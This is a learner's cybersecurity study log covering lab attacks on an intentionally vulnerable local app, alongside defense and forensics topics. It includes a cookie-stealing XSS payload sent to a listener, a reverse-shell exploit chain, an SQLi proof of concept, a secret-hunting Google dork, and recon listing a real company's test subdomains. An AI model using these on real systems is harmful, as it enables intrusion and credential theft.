2. Dictionary — try known passwords (RockYou)
3. Rule-based — mutate dictionary words (P@ssw0rd)
4. Credential Stuffing — reuse breached passwords on other sites
5. Password Spraying — one common password against many users
6. Rainbow Tables — precomputed hash lookups (defeated by salt)
7. Phishing — trick the user into giving the password
8. Keyloggers — malware records keystrokes
9. Online vs Offline — online is slow/blocked, offline is fast/invisible

### The attack I ran
- Tool: node tests/crack-md5.js
- Wordlist: 28 passwords
- Result in VULNERABLE mode (MD5): 3/3 CRACKED in ~11 ms total
- Result in SECURE mode (scrypt): 0/3 cracked, attack blocked

### The math (why MD5 fails)
- MD5: 0.05 ms per hash
- scrypt: 152 ms per hash
- Ratio: ~3000x slower
- 1 million MD5 guesses: 49 seconds
- 1 million scrypt guesses: ~42 hours
- RockYou wordlist (14M) with scrypt: ~25 days per user
- Strong password not in wordlist: millions of years

### Why the cracker stopped on scrypt
- The script checks the prefix (md5$ vs scrypt$)
- It's a training tool for MD5, not a full cracker
- Even if it tried scrypt, 28 words × 152 ms = 4+ seconds, and it would fail
- Real attackers would use Hashcat/GPU but still hit the same wall (scrypt is too slow)

### Why pos-lab has MD5
- It's an intentionally vulnerable training lab
- The code has BOTH md5 and scrypt, toggled by SECURE_MODE
- We flip to MD5 to learn how bad it is
- Real-world apps must NEVER use MD5 for passwords

### Defenses (the full stack)
1. Slow hashing (scrypt/bcrypt/argon2)
2. Unique salt per user
3. Password length (12+ chars, length > complexity)
4. No composition rules (they create patterns)
5. Breach check (Have I Been Pwned)
6. Rate limiting (slow online attacks)
7. Account lockout (stops brute force)
8. MFA (second factor even if password stolen)
9. Unique password per site (defeats credential stuffing)

### My own words (locked in)
- MD5 is banned for passwords (NIST, 2008)
- scrypt is 3000× slower per hash → attack fails
- The cracker didn't "unhash" anything — it guessed, hashed, compared
- Salt kills rainbow tables and cross-user cracking
- Slow hashing kills brute force and dictionary attacks
- The only way to defend is to make guessing too expensive
- Length > complexity (long passwords are stronger than complex short ones)
- NIST 2017 changed the rules: no forced rotation, no composition rules
- pos-lab uses MD5 only for training

### Real-world breaches
- LinkedIn 2012: 6.5M MD5 hashes leaked → cracked in weeks
- RockYou 2009: 32M plaintext passwords → became the standard wordlist
- Adobe 2013: 150M accounts, weak 3DES-ECB
- Every breach → stronger hashing standards

### Connection to other topics
- 12.6 (cryptography) — the math
- 12.7 (symmetric vs asymmetric) — encryption vs hashing
- 12.8 (hashing) — MD5 vs SHA vs scrypt
- 8.7 (password hashing) — salt, pepper, timing attacks
- 12.15 (web hacking) — the attack surface (login forms)
- 12.18 (social engineering) — the human side
## 12.11 Reconnaissance & OSINT — Phase B DONE ✅

Did passive recon on safaricom.co.ke using Certificate Transparency logs.
Found dozens of internal subdomains without touching their servers.

### Core concepts
- Passive Recon = gathering info without touching the target (they don't know)
- Active Recon = sending traffic to the target (they can detect it)
- OSINT = Open Source Intelligence (public info)
- Google Dorking = using search operators (site:, filetype:, inurl:)
- Certificate Transparency = public logs of every SSL cert ever issued
- Job postings reveal tech stack
- GitHub repos can leak secrets (API keys, .env files)
- Shodan indexes internet-connected devices (routers, servers, cameras)

### The OSINT finding (Safaricom)
Using `crt.sh` (Certificate Transparency Logs) with the query `%.safaricom.co.ke`:
- Found dozens of subdomains
- Highlights:
  - `api.safaricom.co.ke` (main API)
  - `selfcare.safaricom.co.ke` (customer portal)
  - `smartinventorytest.safaricom.co.ke` (TEST SERVER)
  - `shubtest.safaricom.co.ke` (TEST SERVER)
  - `testsperesmanager.safaricom.co.ke` (TEST SERVER)

### Why this matters
- Test servers often have weaker security (default passwords, debug mode)
- Company naming conventions are revealed
- Attack surface expands dramatically

### The Google Dork attempt
- Tried `site:github.com ext:env DB_PASSWORD`
- Google's AI blocked it (refused to show results for credential searching)
- Lesson: search engines actively block dorking for secrets
- Real attackers use specialized tools (GitHub secret scanning bypasses) or manual OSINT

### Real commands I ran
- `whois safaricom.co.ke`
- `dig safaricom.co.ke ANY`
- Browser: `https://crt.sh/?q=%25.safaricom.co.ke`
- Browser: `https://www.google.com/search?q=site%3Agithub.com+ext%3Aenv+DB_PASSWORD` (blocked by Google)

### My own words (locked in)
- OSINT = open source intelligence (public info)
- Passive = no touching the target (they don't know)
- Active = touching the target (they can detect)
- crt.sh is a goldmine for finding subdomains
- Test servers are the easiest targets
- Google blocks dorking for secrets
- Attackers don't guess — they gather
- A single cert log can reveal the entire structure of a company
- Recon takes time, but it's the most valuable phase
- "Know yourself, know your enemy" — Sun Tzu
## 12.12 Scanning & Enumeration — Phase B DONE ✅

Ran an aggressive nmap scan (-A) against pos-lab.
Extracted headers, cookies, and service behavior.

### Core concepts
- Passive Recon (12.11) = no touching the target
- Active Recon (12.12) = sending packets to the target
- Port scanning = finding open doors (ports)
- Service detection = identifying what's behind the door
- Enumeration = extracting specific details (users, shares, headers)

### nmap commands
- `nmap -p 1-1000 127.0.0.1` = scan first 1000 ports
- `nmap -sV 127.0.0.1` = service version detection
- `nmap -A 127.0.0.1` = aggressive (OS, version, scripts, traceroute)
- `nmap -sS 127.0.0.1` = stealth SYN scan (needs root)
- `nmap --script vuln` = run vulnerability scan scripts

### The aggressive scan output (-A)
- `3001/tcp open` (the only port)
- `X-Lab-Mode: secure` (instantly reveals the mode)
- `Content-Security-Policy` (XSS defense active)
- `X-Frame-Options: DENY` (clickjacking defense active)
- `Strict-Transport-Security` (HTTPS enforced)
- `Set-Cookie: csrf_token` (CSRF protection active)
- `Service unrecognized` (custom Node.js app, not a known fingerprint)

### My own words (locked in)
- Ports are doors; scanning knocks on them
- nmap -A is like a full inspection of the building
- nmap sends different protocols (HTTP, NCP) to see how the server reacts
- The server responds with 400 Bad Request to junk (good behavior)
- Headers leak a lot of information to attackers
- A missing security header (e.g., no X-Frame-Options) = immediate vulnerability clue
- `-sV` gives versions; versions tell you about CVEs
- Enumeration is where the real dirt is found
- Always get permission before scanning (12.37)

### Connection to other topics
- 12.11 (OSINT) = passive recon
- 12.12 (Scanning) = active recon
- 7.5 (Networking) = ports and protocols
- 8.1 (Web Security) = headers
- 12.15 (Web Hacking) = what to do after finding a service
- pos-lab nmap scan showed exactly what a secure Node app looks like

## 12.40 Reporting & Documentation — Phase B DONE ✅

Wrote a real pentest report for pos-lab (SQLi + XSS).
Learned the structure of professional security documentation.

### The difference between Legal Docs and Reports
- Legal Docs (12.38): Written BEFORE the test (NDA, Scope, RoE).
- Pentest Report (12.40): Written AFTER the test (Findings, Fixes).

### The anatomy of a good report
1. **Executive Summary** — 1 page, no jargon. For the CEO.
2. **Methodology** — What tools, what scope, what dates.
3. **Findings** — Per vulnerability:
   - Title
   - Severity (CVSS)
   - Location (URL/file)
   - Description
   - Proof of Concept (PoC)
   - Impact
   - Remediation (Fix)
4. **Evidence** — Screenshots, logs, payloads.
5. **Remediation Plan** — Prioritized (Today, This Week, This Month).

### CVSS Scores (Severity)
- **9.0 - 10.0 (Critical):** SQLi, RCE, full DB dump.
- **7.0 - 8.9 (High):** Stored XSS, auth bypass.
- **4.0 - 6.9 (Medium):** Username enumeration, missing rate limit.
- **0.1 - 3.9 (Low):** Missing headers, version disclosure.

### Proof of Concept (PoC)
- Not the vulnerability name.
- The exact steps/payload to reproduce it.
- SQLi PoC: `search=' OR 1=1 --`
- XSS PoC: `<img src=x onerror=alert('XSS')>`

### Real commands I ran
- nano ~/master/PRACTICALS/12-cybersecurity/12.40-reporting/pentest-report.md
- cat ~/master/PRACTICALS/12-cybersecurity/12.40-reporting/pentest-report.md

### Things I saw
- A well-structured report.
- Two findings (SQLi, XSS) mapped to CVSS scores.
- A remediation plan with timelines.
- The Executive Summary says "Two critical vulnerabilities" (note: XSS is usually High, not Critical, but that's a minor detail for the summary).

### My own words (locked in)
- A pentest without a report is useless.
- CEOs read the Executive Summary. Devs read the Findings.
- Proof of Concept = the "receipt" that proves the bug works.
- CVSS = the universal language of severity.
- Critical = drop everything. Low = put it on the backlog.
- Remediation must be prioritized.
- "Immediate", "This Week", "This Month" makes it actionable.
- Documentation is a skill. You get better with practice.
## 12.13 Vulnerability Assessment — Phase B DONE ✅

Ran an automated vulnerability scan on pos-lab.
Understood the difference between scanners and manual testing.

### The 3 types of tools
1. Network scanners (nmap, Nessus) — find CVEs in known services.
2. Web app scanners (Burp, ZAP, Nikto) — crawl websites for OWASP bugs.
3. SCA (Software Composition Analysis) — check npm/requirements for old libraries.

### The 3 problems with scanners
1. False Positives (says it's vulnerable, but it's not)
2. False Negatives (says it's safe, but it's vulnerable)
3. Overwhelm (1,000 findings, impossible to fix all at once)

### The difference: Assessment vs Pentest
- Assessment: Find the bugs (mostly automated).
- Pentest: Prove you can break in (mostly manual).

### The real scan I ran
`nmap --script vuln -p 3001 127.0.0.1`
- Result: Port open, service detected.
- **Zero vulnerabilities found.**
- Why? pos-lab is a custom Node.js app. nmap doesn't know how to test custom SQL injection. It only tests known CVEs in known software.

### My own words (locked in)
- Scanners are dumb. They look for patterns.
- Humans are smart. We test logic.
- nmap found the door (port 3001) but couldn't open it because the lock is custom-made.
- A CVE is a public tracking number for a specific bug.
- Not every vulnerability is a breach. An unpatched server is a vulnerability; an exploited server is a breach.
- False positives will make you look foolish if you don't verify manually.
- You must triage: fix Critical today, Low next quarter.
- The best tool is your brain, verifying what the scanner says.

### The difference between finding a bug and proving a breach
- Assessment: "You have SQL injection."
- Pentest: "I logged in as admin using SQL injection and downloaded your user table."

### Real-world example
- nmap missed the SQLi in pos-lab because pos-lab is custom code.
- That's why real pentesters use their hands, not just scripts.
- Companies that rely only on scanners get breached by custom logic bugs.
## 12.14 Exploitation Basics (Mini-MSF) — Phase B DONE ✅

Built a working exploit framework (mini-msf) from scratch.
Executed a reverse shell payload against pos-lab.
Got a real shell (u0_a333).

### The 5 parts of the framework
1. Handler — socket → bind → listen → accept → Session per connection
2. Console — input() loop + module registry
3. Exploit — HTTP POST with auth cookie + eval payload
4. Payload — Python reverse shell with os.dup2
5. Session — send/recv over TCP

### The critical insight
`eval()` + `_$$ND_FUNC$$_` + `import('child_process').exec()` = RCE
`os.dup2(sock.fileno(), 0/1/2)` = shell sees the socket as its terminal

### Real commands I ran
- `nc -lvnp 4444` (listener)
- `python3 ~/test_shell.py` (payload)
- Inside the session: `whoami` → `u0_a333`

### Things I saw
- Connection refused when the listener wasn't running.
- Connection received when the listener was running.
- `whoami` returned `u0_a333`.
- The shell was interactive.

### My own words (locked in)
- Exploitation is proving the bug is real.
- A reverse shell connects FROM the victim TO the attacker (bypasses firewalls).
- `nc` is a simple listener. Metasploit is a full framework.
- The core mechanism is the same: socket + accept + send/recv.
- `os.dup2` redirects stdin/stdout/stderr to the socket.
- The exploit is the delivery truck; the payload is the package.
- Building your own framework is 100x better than using one.
- This is how real attacks work (and why patching matters).
- The eval() in pos-lab's cart was the entry point.
- The Python shell was the payload.
- The listener was the handler.
- The shell was the result.
- This is the core of exploitation.

### Connection to other topics
- 12.13 (Vuln Assessment) — found the bug.
- 12.15 (Web Hacking) — the bug was SQLi/XSS/eval.
- 8.4 (Secure Coding) — parameterized queries, no eval.
- 8.10 (Secure API) — auth is not enough if the code is vulnerable.
- 7.5.2 (Threads) — the handler uses threads.
- 7.5 (Networking) — sockets and ports.
## 12.14 Exploitation Basics (Mini-MSF) — Phase B DONE ✅

Used my custom mini-msf framework to exploit pos-lab.
Successfully got a reverse shell and executed commands.

### The exploit chain
1. Module: `node_js_inject`
2. Login to pos-lab (cookie extraction)
3. Send malicious JSON to `/api/cart/restore`
4. Server evals the payload (`_$$ND_FUNC$$_`)
5. Python reverse shell connects back to port 4444
6. Handler catches Session 1
7. `whoami` returns `u0_a333`

### Real commands I ran
- `use node_js_inject`
- `set RHOST 127.0.0.1`, `set RPORT 3001`, `set LHOST 127.0.0.1`, `set LPORT 4444`
- `run`
- `sessions -l`
- `sessions -i 1`
- `whoami` (inside the shell)

### Things I saw
- `[+] logged in as boss`
- `{"ok":true,"cart":["SENT"]}`
- `[+] Session 1 opened`
- `u0_a333` (from whoami)
- The shell was interactive.

### My own words (locked in)
- Metasploit is just a framework. I built a mini version.
- The handler catches the shell.
- The exploit delivers the payload.
- `eval()` is dangerous.
- `os.dup2` redirects stdio to the socket.
- I now understand the real Metasploit workflow: use, set, run, sessions.
- Typing `LHOSR` instead of `LHOST` showed me how important it is to read options.
- The shell output is messy (raw sockets), but the commands work.
- I can write files to the victim (`echo` > `/tmp/pwned.txt`).

### Connection to other topics
- 12.13 (Vuln Assessment) — found the `eval()` bug.
- 12.15 (Web Hacking) — the bug was in the cart API.
- 8.4 (Secure Coding) — fix: never use `eval()` on user input.
- 7.5.2 (Threads) — the handler uses threads.
- 7.5 (Networking) — sockets, ports, reverse shells.
- Part 8 (Security) — defense: WAF, CSP, input validation.
## 12.19 Blue Team Operations — Phase B DONE ✅

Switched from Red Team (attacker) to Blue Team (defender).
Looked at pos-lab's audit log to see what defenders see.

### Core concepts
- Blue Team = defenders. Detect, respond, contain.
- SOC (Security Operations Center) = the war room. Runs 24/7.
  - Tier 1: Triage alerts.
  - Tier 2: Deep investigation.
  - Tier 3: Threat hunting.
- SIEM = collects logs from all systems and correlates them (Splunk, Sentinel).
- EDR = endpoint detection (watches processes, like the reverse shell).
- IDS/IPS = network detection.

### The Kill Chain (7 steps)
1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control (C2)
7. Actions on Objectives

The Blue Team tries to break the chain at any step.

### Incident Response (6 steps)
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

### Real commands I ran
- `tail -20 ~/pos-lab/logs/audit.log`

### Things I saw
- `login_failed target=admin` (username enumeration attempt).
- `login actor=Sam Seller` (normal login).
- `sale_create actor=Sam Seller target=INV-...` (normal action).
- **Missing:** The IDOR access to user/1 was NOT logged.

### My own words (locked in)
- Blue Team detects and responds. Red Team attacks.
- SIEM is the central brain. It collects logs.
- EDR catches what SIEM misses (endpoint behavior).
- The Kill Chain is the attacker's path. Break it anywhere.
- Incident Response is the playbook.
- A09 (Logging & Monitoring Failures) is dangerous because attackers can move without being seen.
- pos-lab's audit log missed the IDOR attack (because the app didn't log authorization failures).
- In a real SOC, that missing log = a blind spot.
- A good Blue Team demands that developers log EVERY authorization failure.
- Without logs, there is no detection.
- Without detection, there is no incident response.

### Connection to other topics
- 12.11–12.15 (Red Team) — what Blue Team defends against.
- 8.5 (Network Security) — IDS/IPS.
- 8.2 (OWASP) — A09 Logging Failures.
- 12.24 (Incident Response) — deep dive.
- pos-lab's logs in `logs/audit.log`.
## 12.16 Network Attacks (MITM, ARP Spoofing) — Phase B DONE ✅

Learned how attackers intercept network traffic.
Saw unencrypted HTTP traffic in plain text with nc.

### Core concepts
- MITM (Man-in-the-Middle) = attacker sits between you and the server.
- ARP Spoofing = attacker tells your computer they are the router, so all traffic goes to them.
- DNS Spoofing = attacker returns a fake IP for a domain.
- Sniffing = passively reading network traffic.
- Rogue WiFi = fake hotspot that steals credentials.
- HTTPS is the defense (encrypts traffic).
- VPN is the defense (encrypts everything, including DNS).

### How MITM works (the attack chain)
1. Attacker joins the same WiFi.
2. Attacker sends fake ARP replies (spoofing the router).
3. Your device sends traffic to the attacker instead of the router.
4. Attacker reads/modifies the traffic.
5. If HTTPS, attacker sees only encrypted gibberish.
6. If HTTP, attacker sees everything (passwords, cookies, messages).

### Real commands I ran
- `nc -lvnp 8080` (listener)
- `curl -v http://127.0.0.1:8080/test` (client)
- The listener showed the full HTTP request in plain text.

### Things I saw
- The GET request, the Host header, the User-Agent, the Accept header.
- All in plain text (no encryption).
- If this were HTTP login, the password would be visible.

### My own words (locked in)
- HTTPS is not optional. It is mandatory.
- An attacker on the same WiFi can read HTTP traffic.
- ARP spoofing makes the attacker the router.
- DNS spoofing makes the attacker the phonebook.
- The defense is encryption (HTTPS, VPN).
- You can't do ARP spoofing on Android without root (but you can on a laptop).
- Sniffing is passive. ARP spoofing is active.
- Rogue WiFi is the easiest MITM (you voluntarily connect to the attacker).
- tcpdump and tshark are the tools (unavailable on Termux due to mirror issues, but `nc` worked).
- The `nc` listener shows the raw HTTP request — exactly what an attacker sees.

### Connection to other topics
- 12.7 (Symmetric vs Asymmetric) — HTTPS encryption.
- 7.5 (Domain, DNS, HTTPS) — DNS and TLS.
- 8.5 (Network Security) — firewalls, IDS.
- 12.11 (Recon) — finding the target's network.
- 12.12 (Scanning) — finding open ports.
- 12.15 (Web Hacking) — application-layer attacks.
- 12.16 (Network Attacks) — infrastructure-layer attacks.
## Fun Project: Home Network Security Audit — DONE ✅

Ethically hacked my own home WiFi/router.
Found a critical vulnerability (default credentials) and fixed it.

### The findings
- Router: Airtel (192.168.1.1)
- Open ports: 80 (HTTP), 443 (HTTPS), 53 (DNS)
- Admin panel: `http://192.168.1.1` (default login: admin/admin)
- WiFi encryption: WPA3 (excellent)
- SSH: Closed (good)
- Devices on network: Only router + my phone (clean)
- DNS: Working correctly

### The vulnerability found
- Default credentials on the admin panel (`admin` / `admin`).
- If left unchanged, an attacker on the WiFi could log in and:
  - Change the WiFi password (lock me out).
  - Set up DNS spoofing (redirect to fake sites).
  - Open port forwarding (backdoor into my network).
- Severity: Critical.
- Fix: Changed the admin password to a strong one.

### Real commands I ran
- `ip route` (failed: Android sandbox)
- `ifconfig` (found `wlan0: 192.168.1.114`)
- `ping -c 3 192.168.1.1` (router alive)
- `nmap -p 80,443,22,53,8080 192.168.1.1` (found ports)
- `nslookup google.com 192.168.1.1` (DNS working)
- `for i in {1..20}; do ping ...` (host discovery)

### Things I saw
- Router is at `192.168.1.1`.
- My phone is at `192.168.1.114`.
- Ports 80, 443, 53 are open. Port 22 (SSH) is closed.
- The admin panel is an Airtel SPA (Single Page App, with `#/login`).
- `admin` / `admin` logged me in.
- `nslookup` returned Google's real IP (`142.251.38.14`).

### My own words (locked in)
- Default credentials are the #1 way routers get hacked.
- WPA3 is secure (much better than WPA2).
- `ifconfig` gives you your IP and netmask.
- `nmap` can scan local IPs (fast).
- `nslookup` tests DNS.
- A clean network has no unknown devices.
- The admin panel is the router's control center.
- If you don't change the password, anyone on the WiFi can control your router.
- I fixed the vulnerability (changed the password).
- This was a real, legal, ethical hack of my own network.

### Connection to other topics
- 12.11 (Recon) — finding the router.
- 12.12 (Scanning) — nmap.
- 12.16 (Network Attacks) — DNS spoofing, MITM.
- 8.7 (Password Hashing) — password strength.
- 12.15 (Web Hacking) — the admin panel is a web app.
- 8.5 (Network Security) — router as perimeter.
- 12.19 (Blue Team) — I patched the vulnerability.
- 12.37/12.38 (Legal) — it's my own network, so legal.

## 12.26 Forensics Fundamentals — Phase B DONE ✅

Learned the basics of digital forensics.
Captured volatile and persistent data on my phone.

### Core concepts
- Digital Forensics = investigating a cybercrime after it happens.
- Preserve evidence. Never alter the original.
- Take a **forensic image** (bit-for-bit copy) of the disk.
- Analyze the copy, not the original.

### The 3 Golden Rules
1. **Never alter the original** — image the disk first.
2. **Order of Volatility** — collect the most volatile data first:
   - CPU registers → RAM → Network connections → Processes → Disk → Backups → Physical.
3. **Chain of Custody** — log everyone who touches the evidence (who, when, why).

### The artifacts
- **RAM:** Running processes, network connections, passwords.
- **Disk:** Files, deleted files, logs, browser history.
- **Network:** PCAP files, firewall logs.
- **Mobile:** SMS, call logs, GPS.

### Real commands I ran
- `ps aux | head -5` (volatile data)
- `ls -la ~/` (persistent data)

### Things I saw
- `bash`, `sshd`, `python -m http.server 8000` running (volatile).
- Files in `~/` (persistent).
- `ps aux` shows the live state of the system.

### My own words (locked in)
- Forensics is investigating a crime scene after the crime.
- RAM is volatile. Disk is persistent.
- Collect RAM first.
- Never alter the original evidence.
- Take a forensic image (copy).
- Chain of custody proves the evidence wasn't tampered with.
- The order of volatility: CPU → RAM → network → processes → disk → backups.
- In real cases, investigators keep the laptop open (do not reboot) to preserve the RAM.
- The Silk Road case (2013) is a perfect example: FBI grabbed the laptop and kept it open to preserve the session.

### Connection to other topics
- 12.19 (Blue Team) — detection leads to forensics.
- 7.5.2 (Processes) — running processes are evidence.
- 7.5.3 (Memory) — RAM is volatile evidence.
- 7.5.4 (File Systems) — disk is persistent evidence.
- 12.14 (Exploitation) — the attacker's process is in the RAM.
- 12.11 (Recon) — the attacker's footprint on disk.
## 12.27 Disk & File System Forensics — Phase B DONE ✅

Created a virtual disk, hid a file, deleted it, and recovered it using debugfs.

### Core concepts
- **Inode:** Stores file metadata (owner, permissions, size, timestamps, block locations).
- **Data blocks:** Store the actual content.
- **Directory entry:** Maps the filename to the inode.
- **Deletion:** The OS marks the inode as free and removes the directory entry.
  - The data blocks are NOT wiped.
  - The data remains until overwritten.
- **File carving:** Recovering files without the file system metadata (using file signatures).
- **Slack space:** Leftover space between the end of a file and the end of its block.

### The forensic process
1. Image the disk (bit-for-bit copy).
2. Hash the image (prove integrity).
3. Analyze the image (not the original).
4. Extract artifacts (deleted files, slack space, metadata).
5. Document (chain of custody).

### Real commands I ran
- `dd if=/dev/zero of=disk.img bs=1M count=10` (create blank disk)
- `mkfs.ext4 disk.img` (format as ext4)
- `echo "SECRET: ..." > secret.txt` (create secret)
- `debugfs -w -R "write secret.txt /secret.txt" disk.img` (put file inside)
- `debugfs -R "ls -l /" disk.img` (see it)
- `debugfs -w -R "rm /secret.txt" disk.img` (delete it)
- `debugfs -R "lsdel" disk.img` (find deleted inodes)
- `debugfs -R "cat <13>" disk.img` (recover the content)

### Things I saw
- `secret.txt` was inode 13.
- After deletion, it was gone from `ls -l`.
- `lsdel` showed inode 13 as deleted.
- `cat <13>` recovered the content: "SECRET: The password is felix123".

### My own words (locked in)
- Deleting a file does not delete the data.
- It removes the directory entry and marks the inode as free.
- The data survives until overwritten.
- `debugfs` can recover deleted files.
- In real forensics, investigators use `photorec`, `sleuthkit`, `autopsy`.
- Disk images are taken with `dd` or `dcfldd`.
- Hashes prove the image wasn't tampered with.
- This is how criminals get caught: the evidence was still there.

### Connection to other topics
- 12.26 (Forensics Fundamentals) — chain of custody, order of volatility.
- 7.5.4 (File Systems) — inodes, permissions, disk layout.
- 12.15 (Web Hacking) — attackers try to delete logs (data remains).
- 12.19 (Blue Team) — detection leads to forensic analysis.
- 8.5 (Network Security) — logs are persistent evidence.
## Game: XSS Attack on pos-lab — COMPLETE ✅

Played a red team game. Attacked pos-lab from scratch using CLI.

### The kill chain
1. `curl -I` → found `X-Lab-Mode: vulnerable` and missing CSP headers.
2. `curl -s ... | grep "input\|form"` → found login form.
3. `curl -s ... | grep "password\|username"` → found leaked credentials in the HTML `value` attribute (`boss` / `boss123`).
4. Logged in with `curl -c` to save cookies (`~/boss_cookies.txt`).
5. Found the XSS vulnerability in `/manager/products.html`.
6. Injected `<img src=x onerror=alert("XSS")>` via `POST /api/products` (authenticated with cookies).
7. The payload fired in the browser (popup).
8. Upgraded to cookie stealing: `<img src=x onerror="fetch('http://127.0.0.1:9999/?c='+document.cookie)">`
9. Listener on port 9999 caught the stolen `csrf_token`.

### Real commands I ran
- `curl -I http://127.0.0.1:3001`
- `curl -s http://127.0.0.1:3001 | grep -i "input\|form\|password"`
- `curl -s -c ~/boss_cookies.txt -X POST http://127.0.0.1:3001/api/auth/login ...`
- `curl -s -X POST http://127.0.0.1:3001/api/products -b ~/boss_cookies.txt -H "Content-Type: application/json" -d '{"name":"<img src=x onerror=...>", ...}'`
- `nc -lvnp 9999` (listener)

### Things I saw
- `X-Lab-Mode: vulnerable`.
- Missing security headers (`Content-Security-Policy`, `X-Frame-Options`).
- Default credentials in the HTML `value` attribute.
- `pos_token` is HttpOnly (can't be stolen via JS).
- `csrf_token` is NOT HttpOnly (stolen via XSS).
- The XSS payload fired in the browser.
- The listener caught the stolen token.

### My own words (locked in)
- Black-box hacking: you start with nothing and find everything.
- Default credentials in HTML are a massive security leak.
- `pos_token` is HttpOnly (safe from XSS).
- `csrf_token` is not HttpOnly (vulnerable to XSS).
- XSS + CSRF token theft = full account takeover.
- The browser blocks `<script>` injected via innerHTML, but `<img onerror>` works.
- The full kill chain: recon → enumeration → exploit → impact.
- This is exactly how real attackers operate.

### Connection to other topics
- 12.11 (Recon) — finding the server.
- 12.12 (Scanning) — header analysis.
- 8.8 (Auth) — username enumeration.
- 12.15 (Web Hacking) — XSS/CSRF.
- 8.4 (Secure Coding) — the fix (textContent, CSP).
- 8.10 (Secure API) — the fix (HttpOnly cookies).
- 12.14 (Exploitation) — the full attack chain.
- 12.19 (Blue Team) — how to defend against this.

## 12.20 SIEM & Log Analysis — Phase B DONE ✅

Analyzed pos-lab's real audit log.
Found brute force patterns using grep and sort.

### Core concepts
- **SIEM** = Security Information and Event Management.
- **Collects** logs from servers, firewalls, apps, cloud.
- **Normalizes** them (one format).
- **Correlates** them (finds patterns).
- **Alerts** on suspicious patterns.
- **Syslog format:** timestamp, hostname, app, message.
- **Log levels:** DEBUG, INFO, WARNING, ERROR, CRITICAL.

### Correlation (The magic)
- One log line is not an alert. A pattern is an alert.
- **Brute force:** >5 failed logins from same IP in 1 minute.
- **Credential stuffing:** many failed logins from different IPs on same user.
- **Privilege escalation:** `sudo` after login from new IP.
- **Data exfiltration:** 1GB outbound traffic at 3 AM.
- **Port scan:** 1000 connection attempts to different ports.

### Real commands I ran
- `grep "login_failed" ~/pos-lab/logs/audit.log | wc -l` → 89 failures.
- `grep "login_failed" ... | grep -oE "ip=[0-9.]+" | sort | uniq -c` → 89 from 127.0.0.1.
- `grep "login_failed" ... | grep -oE "[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}" | sort | uniq -c` → found spikes.

### Things I saw
- 89 total failed logins.
- All from 127.0.0.1 (local testing).
- Spikes: 12 in 2 minutes (Oct 12), 8 in 1 minute (Oct 22), 22 in 3 minutes (Oct 23).
- These are brute force patterns.

### My own words (locked in)
- SIEM = collects, correlates, alerts.
- One log line is noise. A pattern is a signal.
- 5 failed logins in 1 minute = brute force alert.
- 1000 connection attempts = port scan alert.
- Logs are the source of truth for forensics (12.26).
- Alert fatigue is real (66% of alerts ignored).
- SIEM tuning is critical (too many false positives = ignored alerts).
- Real SIEMs: Splunk, Elastic, Sentinel, Wazuh, Graylog.
- I just did a mini-SIEM with `grep`, `sort`, and `uniq`.

### Connection to other topics
- 12.19 (Blue Team) — detection is the first step.
- 7.12 (Monitoring) — metrics vs logs.
- 12.26 (Forensics) — logs are evidence.
- 8.8 (Auth Attacks) — brute force is the attack.
- 8.9 (Rate Limiting) — the defense against brute force.
- 12.15 (Web Hacking) — the attacks leave logs.
- pos-lab's `logs/audit.log` is the raw data.
## 12.21 Intrusion Detection & Prevention (Deep) — Phase B DONE ✅

Understood IDS vs IPS, signature vs anomaly.
Analyzed real logs to see what an IPS would block.

### Core concepts
- **IDS** = Intrusion Detection System. Watches, alerts, does NOT block.
- **IPS** = Intrusion Prevention System. Watches, alerts, BLOCKS.
- **NIDS/NIPS** = Network-level (whole network).
- **HIDS/HIPS** = Host-level (one server).

### The 2 detection types
1. **Signature-based** (blacklist):
   - Matches known patterns (e.g., `' OR 1=1`).
   - Accurate, low false positives.
   - Misses zero-days.
2. **Anomaly-based** (whitelist):
   - Learns normal traffic, alerts on deviations.
   - Catches new attacks.
   - High false positives.

### Inline vs Promiscuous
- **IDS (promiscuous):** Copies traffic, cannot block.
- **IPS (inline):** Traffic flows through it, can drop packets.

### The tools
- **Suricata** (industry standard, fast).
- **Snort** (classic).
- **Zeek** (deep analysis).
- **Wazuh / OSSEC** (host-based).
- **Splunk / Elastic** (SIEM for alerts).

### A real Suricata rule
*"Alert if any TCP traffic on port 80 contains `' OR 1=1`."*

### Real commands I ran
- `cat ~/pos-lab/logs/audit.log | grep "login_failed" | tail -5`

### Things I saw
- Two failed logins for `admin` in **22 milliseconds** (bot behavior).
- Three scattered failed logins over 2 days (human behavior).
- An IPS would block the first (signature: too fast).
- An IPS would allow the second (normal).

### My own words (locked in)
- IDS = watch and alert. IPS = watch, alert, and block.
- Signature-based = known attacks. Anomaly-based = new attacks.
- Firewall blocks ports. IPS blocks payloads.
- 2 logins in 22ms = bot. An IPS blocks it.
- 1 login per day = human. An IPS allows it.
- Alert fatigue is real. IPS reduces it by blocking automatically.
- Suricata is the industry standard.
- Inline IPS can drop packets before they reach the server.
- A firewall is a bouncer. An IPS is a bodyguard who checks your pockets.

### Connection to other topics
- 12.16 (Network Attacks) — what IPS defends against.
- 12.20 (SIEM) — the logs the IPS generates.
- 8.5 (Network Security) — the firewall vs IPS difference.
- 8.9 (Rate Limiting) — the defense against brute force.
- 12.15 (Web Hacking) — the payloads the IPS detects.
- 2.13 (IDS/IPS basics) — the foundation.
## 12.22 Endpoint Security (EDR, Antivirus) — Phase B DONE ✅

Understood endpoint security and the evolution from antivirus to EDR.
Saw what an EDR looks at (processes, network, behavior).

### Core concepts
- **Endpoint** = laptop, server, phone, or any device on the network.
- **Antivirus** = signature-based, looks for known viruses (files).
- **EDR** = Endpoint Detection & Response. Behavioral, records everything, responds.
- **XDR** = Extended Detection & Response. EDR + network + cloud + email.

### The evolution
1. Antivirus (1990s) — signature-based, reactive.
2. Next-Gen Antivirus (2010s) — AI + behavior.
3. EDR (2020s) — detects + responds + threat hunting.
4. XDR (now) — unified defense across all layers.

### EDR vs Antivirus
| Feature | Antivirus | EDR |
|---------|-----------|-----|
| Detection | Signatures | Behavior + AI |
| Action | Quarantine | Kill process, isolate host |
| Visibility | Files | Processes, network, memory |
| Response | Alert | Automated response |

### How EDR works (3 phases)
1. **Collect:** Every process, file, network connection, login.
2. **Detect:** Rules + AI to find suspicious behavior (e.g., PowerShell -enc).
3. **Respond:** Kill, quarantine, isolate, rollback.

### Threats EDR stops
- Ransomware (mass encryption).
- Fileless malware (runs in memory, no file).
- Living-off-the-Land (PowerShell, wmic abused).
